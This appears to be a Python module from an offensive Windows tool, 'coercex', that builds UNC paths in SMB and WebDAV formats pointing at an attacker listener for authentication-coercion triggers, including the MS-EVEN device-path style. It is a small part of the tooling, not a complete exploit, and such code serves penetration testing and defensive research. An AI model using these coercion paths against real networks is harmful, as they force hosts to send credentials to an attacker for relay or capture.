"""UNC path construction for coercion triggers."""

from __future__ import annotations

import logging

from coercex.models import Transport

log = logging.getLogger("coercex.unc")


def build_unc_path(
    listener: str,
    token: str,
    transport: Transport = Transport.SMB,
    port: int | None = None,
    path_style: str = "share",
) -> str:
    """Build a UNC path for coercion.

    Args:
        listener: Attacker IP/hostname.
        token: Unique correlation token.
        transport: SMB or HTTP (WebDAV).
        port: Listener port (used for WebDAV @port syntax, and for
              non-standard SMB ports which are automatically promoted
              to WebDAV format since SMB UNC paths always go to 445).

    Returns:
        UNC path string.
    """
    if transport == Transport.HTTP:
        # WebDAV format: \\host@port\path
        port_str = f"@{port}" if port else "@80"
        host = f"{listener}{port_str}"
    elif port is not None and port != 445:
        # Non-standard SMB port: must use WebDAV @port format because
        # standard SMB UNC paths (\\host\share) always connect to 445.
        host = f"{listener}@{port}"
    else:
        host = listener

    match path_style:
        case "share_file":
            return f"\\\\{host}\\{token}\\file.txt\x00"
        case "share_trailing":
            return f"\\\\{host}\\{token}\\\x00"
        case "share":
            return f"\\\\{host}\\{token}\x00"
        case "bare":
            return f"\\\\{host}\x00"
        case "unc_device":
            # \\?\UNC\host\share format used by MS-EVEN
            return f"\\??\\UNC\\{host}\\{token}\\aa"
        case _:
            return f"\\\\{host}\\{token}\x00"
